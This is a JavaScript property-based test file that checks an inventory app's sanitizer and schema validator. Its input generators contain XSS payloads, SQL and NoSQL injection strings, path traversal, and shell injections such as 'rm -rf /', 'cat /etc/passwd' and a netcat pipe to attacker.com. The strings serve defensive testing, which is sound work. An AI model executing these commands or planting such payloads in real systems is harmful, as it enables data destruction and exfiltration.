const fc = require('fast-check');
const { sanitizeString, validateSchema, validateAndSanitize } = require('../utils/validation');
const { thingSchema, categorySchema } = require('../utils/schemas');

describe('Validation Property Tests', () => {
  /**
   * Feature: security-enhancements, Property 8: String sanitization removes malicious content
   * 
   * Property 8: String sanitization removes malicious content
   * For any string input containing potentially malicious patterns (script tags, SQL injection attempts), 
   * the sanitized output should not contain executable code.
   * Validates: Requirements 2.1
   */
  test('Property 8: String sanitization removes malicious content', async () => {
    await fc.assert(
      fc.property(
        // Generate strings with potentially malicious content
        fc.oneof(
          // Script tags
          fc.string().map(s => `<script>${s}</script>`),
          fc.string().map(s => `<script src="${s}"></script>`),
          fc.string().map(s => `<SCRIPT>${s}</SCRIPT>`),
          
          // JavaScript protocol
          fc.string().map(s => `javascript:${s}`),
          fc.string().map(s => `JAVASCRIPT:${s}`),
          
          // Event handlers
          fc.string().map(s => `onclick="${s}"`),
          fc.string().map(s => `onload="${s}"`),
          fc.string().map(s => `onerror="${s}"`),
          
          // HTML special characters
          fc.string().map(s => `${s}<>&"'/`),
          
          // Mixed malicious content
          fc.string().map(s => `<script>alert('${s}')</script><img onerror="javascript:alert('xss')" src="x">`),
          
          // Regular strings (should pass through safely)
          fc.string()
        ),
        
        (maliciousInput) => {
          // Act: Sanitize the input
          const sanitized = sanitizeString(maliciousInput);
          
          // Assert: HTML special characters should be encoded
          if (maliciousInput.includes('<')) {
            expect(sanitized).toContain('&lt;');
            expect(sanitized).not.toContain('<');
          }
          if (maliciousInput.includes('>')) {
            expect(sanitized).toContain('&gt;');
            expect(sanitized).not.toContain('>');
          }
          if (maliciousInput.includes('"')) {
            expect(sanitized).toContain('&quot;');
            expect(sanitized).not.toContain('"');
          }
          if (maliciousInput.includes("'")) {
            expect(sanitized).toContain('&#x27;');
            expect(sanitized).not.toContain("'");
          }
          if (maliciousInput.includes('&') && !maliciousInput.includes('&amp;')) {
            expect(sanitized).toContain('&amp;');
          }
          if (maliciousInput.includes('/')) {
            expect(sanitized).toContain('&#x2F;');
            expect(sanitized).not.toContain('/');
          }
          
          // Assert: No javascript: protocol should remain (case insensitive)
          expect(sanitized.toLowerCase()).not.toContain('javascript:');
          
          // Assert: Script tags should be encoded, not executable
          expect(sanitized).not.toMatch(/<script/i);
          expect(sanitized).not.toMatch(/<\/script>/i)
          
          // Assert: Result should be a string
          expect(typeof sanitized).toBe('string');
        }
      ),
      { numRuns: 100 }
    );
  });

  /**
   * Feature: security-enhancements, Property 9: Schema validation catches invalid data
   * 
   * Property 9: Schema validation catches invalid data
   * For any entity data with invalid types or missing required fields, schema validation 
   * should reject the data and return validation errors.
   * Validates: Requirements 2.2
   */
  test('Property 9: Schema validation catches invalid data', async () => {
    await fc.assert(
      fc.property(
        // Generate invalid data that should fail validation
        fc.oneof(
          // Missing required fields
          fc.constant({
            description: 'test description',
            inventoryId: '12345678-1234-1234-1234-123456789012'
            // Missing 'name' field
          }),
          fc.constant({
            name: 'test name',
            description: 'test description'
            // Missing 'inventoryId' field
          }),
          
          // Wrong types
          fc.constant({
            name: 123, // Should be string
            inventoryId: '12345678-1234-1234-1234-123456789012',
            description: 'test description'
          }),
          fc.constant({
            name: 'test name',
            inventoryId: 123, // Should be UUID string
            description: 'test description'
          }),
          
          // Invalid string lengths
          fc.constant({
            name: 'a'.repeat(256), // Too long (max 255)
            inventoryId: '12345678-1234-1234-1234-123456789012',
            description: 'test description'
          }),
          fc.constant({
            name: '', // Empty string
            inventoryId: '12345678-1234-1234-1234-123456789012',
            description: 'test description'
          }),
          fc.constant({
            name: '   ', // Only whitespace
            inventoryId: '12345678-1234-1234-1234-123456789012',
            description: 'test description'
          }),
          
          // Invalid UUID format
          fc.constant({
            name: 'test name',
            inventoryId: 'not-a-uuid',
            description: 'test description'
          }),
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-12345678901', // Too short
            description: 'test description'
          }),
          
          // Invalid array types
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: 'not-an-array' // Should be array
          }),
          
          // Invalid nested object structure
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: [123, 456] // Should be array of strings
          }),
          
          // Invalid nested array with too long strings
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['a'.repeat(501)] // String too long (max 500)
          })
        ),
        
        (invalidData) => {
          // Act: Validate the invalid data against thing schema
          const result = validateSchema(invalidData, thingSchema);
          
          // Assert: Validation should fail
          expect(result.valid).toBe(false);
          
          // Assert: Should have error messages
          expect(result.errors).toBeDefined();
          expect(Array.isArray(result.errors)).toBe(true);
          expect(result.errors.length).toBeGreaterThan(0);
          
          // Assert: Should not return sanitized data when invalid
          expect(result.sanitizedData).toBeNull();
          
          // Assert: Error messages should be informative
          result.errors.forEach(error => {
            expect(typeof error).toBe('string');
            expect(error.length).toBeGreaterThan(0);
          });
        }
      ),
      { numRuns: 100 }
    );
  });

  /**
   * Feature: security-enhancements, Property 10: Special characters are properly encoded
   * 
   * Property 10: Special characters are properly encoded
   * For any input containing special characters, the sanitized output should have those 
   * characters properly escaped or encoded to prevent injection attacks.
   * Validates: Requirements 2.4
   */
  test('Property 10: Special characters are properly encoded', async () => {
    await fc.assert(
      fc.property(
        // Generate strings with various special characters
        fc.oneof(
          // HTML special characters
          fc.string().map(s => `${s}<>&"'/`),
          
          // SQL injection patterns
          fc.string().map(s => `${s}'; DROP TABLE users; --`),
          fc.string().map(s => `${s}" OR "1"="1`),
          fc.string().map(s => `${s}' UNION SELECT * FROM passwords --`),
          
          // NoSQL injection patterns
          fc.string().map(s => `${s}{"$ne": null}`),
          fc.string().map(s => `${s}{"$gt": ""}`),
          
          // Path traversal
          fc.string().map(s => `${s}../../../etc/passwd`),
          fc.string().map(s => `${s}..\\..\\..\\windows\\system32`),
          
          // Command injection
          fc.string().map(s => `${s}; rm -rf /`),
          fc.string().map(s => `${s} && cat /etc/passwd`),
          fc.string().map(s => `${s} | nc attacker.com 4444`),
          
          // Regular strings with special chars
          fc.string().filter(s => /[<>&"'/\\;|&$]/.test(s))
        ),
        
        (inputWithSpecialChars) => {
          // Act: Sanitize the input
          const sanitized = sanitizeString(inputWithSpecialChars);
          
          // Assert: HTML special characters should be encoded
          if (inputWithSpecialChars.includes('<')) {
            expect(sanitized).toContain('&lt;');
            expect(sanitized).not.toContain('<');
          }
          
          if (inputWithSpecialChars.includes('>')) {
            expect(sanitized).toContain('&gt;');
            expect(sanitized).not.toContain('>');
          }
          
          if (inputWithSpecialChars.includes('&') && !inputWithSpecialChars.includes('&amp;')) {
            expect(sanitized).toContain('&amp;');
          }
          
          if (inputWithSpecialChars.includes('"')) {
            expect(sanitized).toContain('&quot;');
            expect(sanitized).not.toContain('"');
          }
          
          if (inputWithSpecialChars.includes("'")) {
            expect(sanitized).toContain('&#x27;');
            expect(sanitized).not.toContain("'");
          }
          
          if (inputWithSpecialChars.includes('/')) {
            expect(sanitized).toContain('&#x2F;');
            expect(sanitized).not.toContain('/');
          }
          
          // Assert: Common injection patterns should be encoded (not necessarily removed)
          // The goal is to make them safe, not necessarily remove them entirely
          // SQL injection patterns will be encoded through special character encoding
          if (inputWithSpecialChars.includes("'")) {
            expect(sanitized).not.toContain("'"); // Single quotes should be encoded
          }
          if (inputWithSpecialChars.includes('"')) {
            expect(sanitized).not.toContain('"'); // Double quotes should be encoded
          }
          
          // Assert: Result should be safe for HTML context
          expect(sanitized).not.toMatch(/<[^>]*>/);
          
          // Assert: Result should be a string
          expect(typeof sanitized).toBe('string');
        }
      ),
      { numRuns: 100 }
    );
  });

  /**
   * Feature: security-enhancements, Property 11: Recursive validation checks nested structures
   * 
   * Property 11: Recursive validation checks nested structures
   * For any nested object or array with invalid data at any depth, recursive validation 
   * should detect and report the validation error.
   * Validates: Requirements 2.5
   */
  test('Property 11: Recursive validation checks nested structures', async () => {
    await fc.assert(
      fc.property(
        // Generate nested structures with known invalid data
        fc.oneof(
          // Valid nested structure
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['photo1.jpg', 'photo2.jpg'],
            tags: ['tag1', 'tag2']
          }),
          
          // Invalid data in photos array - string too long
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['a'.repeat(501)], // Invalid - too long (max 500)
            tags: ['tag1']
          }),
          
          // Invalid data in photos array - wrong type
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: [123], // Invalid - should be string
            tags: ['tag1']
          }),
          
          // Invalid data in tags array - string too long
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['photo1.jpg'],
            tags: ['a'.repeat(51)] // Invalid - too long (max 50)
          }),
          
          // Invalid data in tags array - wrong type
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['photo1.jpg'],
            tags: [123] // Invalid - should be string
          }),
          
          // Multiple invalid nested items
          fc.constant({
            name: 'test name',
            inventoryId: '12345678-1234-1234-1234-123456789012',
            photos: ['a'.repeat(501), 123], // Both invalid
            tags: ['a'.repeat(51), 456] // Both invalid
          })
        ),
        
        (nestedData) => {
          // Act: Validate the nested data against thing schema
          const result = validateSchema(nestedData, thingSchema);
          
          // Determine if the data should be valid based on the specific test case
          let shouldBeValid = true;
          
          // Check for known invalid patterns
          if (nestedData.photos) {
            for (let i = 0; i < nestedData.photos.length; i++) {
              const photo = nestedData.photos[i];
              if (typeof photo !== 'string' || photo.length > 500) {
                shouldBeValid = false;
                break;
              }
            }
          }
          
          if (nestedData.tags) {
            for (let i = 0; i < nestedData.tags.length; i++) {
              const tag = nestedData.tags[i];
              if (typeof tag !== 'string' || tag.length > 50) {
                shouldBeValid = false;
                break;
              }
            }
          }
          
          if (shouldBeValid) {
            // Assert: Valid nested data should pass validation
            expect(result.valid).toBe(true);
            expect(result.errors).toHaveLength(0);
            expect(result.sanitizedData).toBeDefined();
            
            // Assert: Nested arrays should be properly sanitized
            if (result.sanitizedData.photos) {
              result.sanitizedData.photos.forEach(photo => {
                expect(typeof photo).toBe('string');
                expect(photo.length).toBeLessThanOrEqual(500);
              });
            }
            
            if (result.sanitizedData.tags) {
              result.sanitizedData.tags.forEach(tag => {
                expect(typeof tag).toBe('string');
                expect(tag.length).toBeLessThanOrEqual(50);
              });
            }
          } else {
            // Assert: Invalid nested data should fail validation
            expect(result.valid).toBe(false);
            expect(result.errors.length).toBeGreaterThan(0);
            expect(result.sanitizedData).toBeNull();
            
            
            // Assert: Error messages should indicate the nested location
            const hasNestedError = result.errors.some(error => 
              error.includes('[') || error.includes('photos') || error.includes('tags') || 
              error.includes('exceeds maximum length') || error.includes('must be a string')
            );
            expect(hasNestedError).toBe(true);
          }
        }
      ),
      { numRuns: 100 }
    );
  });

  // Additional test for valid data to ensure validation doesn't reject good data
  test('Valid data passes validation and sanitization', async () => {
    await fc.assert(
      fc.property(
        // Generate valid thing data
        fc.record({
          name: fc.string({ minLength: 1, maxLength: 255 }).filter(s => s.trim().length > 0),
          inventoryId: fc.uuid(),
          description: fc.option(fc.string({ maxLength: 1000 }), { nil: '' }),
          photos: fc.option(fc.array(fc.string({ maxLength: 500 }), { maxLength: 10 }), { nil: [] }),
          tags: fc.option(fc.array(
            fc.string({ minLength: 1, maxLength: 50 })
              .filter(s => /^[a-zA-Z0-9_-]+$/.test(s.trim())), // Only valid tag characters
            { maxLength: 20 }
          ), { nil: [] }),
          value: fc.option(fc.float({ min: 0, max: 1000000, noNaN: true }), { nil: undefined }),
          serialNumber: fc.option(fc.string({ maxLength: 100 }), { nil: '' }),
          model: fc.option(fc.string({ maxLength: 100 }), { nil: '' }),
          brand: fc.option(fc.string({ maxLength: 100 }), { nil: '' }),
          condition: fc.option(fc.string({ maxLength: 50 }), { nil: '' }),
          notes: fc.option(fc.string({ maxLength: 2000 }), { nil: '' })
        }),
        
        (validData) => {
          // Act: Validate the valid data
          const result = validateAndSanitize(validData, thingSchema);
          
          // Assert: Valid data should pass validation
          expect(result.valid).toBe(true);
          expect(result.errors).toHaveLength(0);
          expect(result.data).toBeDefined();
          
          // Assert: Required fields should be present and sanitized
          expect(result.data.name).toBeDefined();
          expect(typeof result.data.name).toBe('string');
          expect(result.data.name.length).toBeGreaterThan(0);
          expect(result.data.inventoryId).toBe(validData.inventoryId);
          
          // Assert: Optional fields should be properly handled
          if (validData.description) {
            expect(result.data.description).toBeDefined();
            expect(typeof result.data.description).toBe('string');
          }
          
          // Assert: Arrays should be properly validated and sanitized
          if (validData.photos) {
            expect(Array.isArray(result.data.photos)).toBe(true);
            result.data.photos.forEach(photo => {
              expect(typeof photo).toBe('string');
              expect(photo.length).toBeLessThanOrEqual(500);
            });
          }
          
          if (validData.tags) {
            expect(Array.isArray(result.data.tags)).toBe(true);
            result.data.tags.forEach(tag => {
              expect(typeof tag).toBe('string');
              expect(tag.length).toBeLessThanOrEqual(50);
            });
          }
        }
      ),
      { numRuns: 100 }
    );
  });
});